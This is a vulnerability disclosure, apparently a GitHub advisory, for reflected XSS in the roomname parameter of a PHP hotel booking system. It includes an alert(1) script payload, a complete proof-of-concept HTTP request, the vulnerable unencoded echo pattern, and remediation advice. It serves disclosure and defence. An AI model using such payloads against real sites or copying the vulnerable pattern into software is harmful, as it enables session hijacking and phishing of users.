## Reflected Cross-Site Scripting (XSS) in Online Hotel Booking System roomname Parameter
## Credit

Discovered by: 
Ahmad Marzouk

## Product

Online Hotel Booking System in PHP

## Vendor

Code-Projects

## Vendor Homepage

https://code-projects.org/online-hotel-booking-in-php-css-js-and-mysql-free-download/

## Affected Version

Online Hotel Booking System v1.0

## Vulnerability Type

Reflected Cross-Site Scripting (Reflected XSS)

CWE

CWE-79 – Improper Neutralization of Input During Web Page Generation (Cross-Site Scripting)

## Severity

Medium

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the Online Hotel Booking System in PHP within the booking functionality.

The vulnerability occurs in the following endpoint:

/hotel booking/booknow.php

The application processes user-controlled input through the roomname parameter supplied via the HTTP GET request. The value of this parameter is reflected in the application response without proper validation or output encoding.

Because the application directly includes the user-supplied value in the HTML output, malicious HTML or JavaScript code can be injected and executed in the browser of users who access a specially crafted URL.

During testing, it was observed that injecting JavaScript code into the roomname parameter results in script execution when the page is rendered.

 injected value:

Duplexerwat<script>alert(1)</script>d494k

This indicates that the application fails to properly sanitize or encode user input before rendering it in the browser.

## Root Cause

The vulnerability is caused by improper handling of user-controlled input.

The application retrieves the value of the roomname parameter from the URL and inserts it directly into the HTML response without applying output encoding functions such as htmlspecialchars().

A typical vulnerable pattern is:

$roomname = $_GET['roomname'];
echo $roomname;

Because the input is not sanitized or encoded, HTML tags included in the input are interpreted and executed by the browser.

## Affected Endpoint
/hotel booking/booknow.php
## Vulnerable Parameter
roomname
## HTTP Method
GET
## Proof of Concept

The following HTTP request demonstrates exploitation of the vulnerability:
 ```plain
GET /hotel%20booking/booknow.php?roomname=Duplexerwat%3cscript%3ealert(1)%3c%2fscript%3ed494k HTTP/1.1
Host: localhost
Cache-Control: max-age=0
Sec-CH-UA: "Google Chrome";v="145", "Not=A?Brand";v="8", "Chromium";v="145"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "macOS"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=05vcfd9u511n9t430adbl9a597
Upgrade-Insecure-Requests: 1
Referer: https://localhost/hotel%20booking/room.php
Content-Length: 0
 ```

PoC 1

<img width="1494" height="893" alt="Image" src="https://github.com/user-attachments/assets/fa0e571c-5642-4021-8429-17bc587f4c14" />

## Steps to Reproduce

Install the Online Hotel Booking System in PHP.

Open a web browser.

Navigate to the following URL:

http://localhost/hotel%20booking/booknow.php?roomname=Duplexerwat<script>alert(1)</script>d494k

Observe the page response.

## Result

The injected JavaScript payload executes in the browser, confirming that user input is reflected without proper sanitization.

## Impact

Successful exploitation of this vulnerability may allow attackers to:

Execute arbitrary JavaScript in victim browsers

Steal session cookies

Hijack user sessions

Perform actions on behalf of users

Redirect users to malicious websites

Conduct phishing attacks

## Vulnerability Classification
CWE

CWE-79 – Cross-Site Scripting

OWASP Top 10

A03:2021 – Injection

## Suggested Remediation
Output Encoding

Encode user input before rendering it in HTML:

echo htmlspecialchars($roomname, ENT_QUOTES, 'UTF-8');
Input Validation

Validate user input and reject unexpected characters.

Content Security Policy

Implement CSP headers:

Content-Security-Policy: default-src 'self'

## PoC 2

<img width="1486" height="874" alt="Image" src="https://github.com/user-attachments/assets/c2f0343d-9c03-47fb-b473-cfb75f95a66d" />
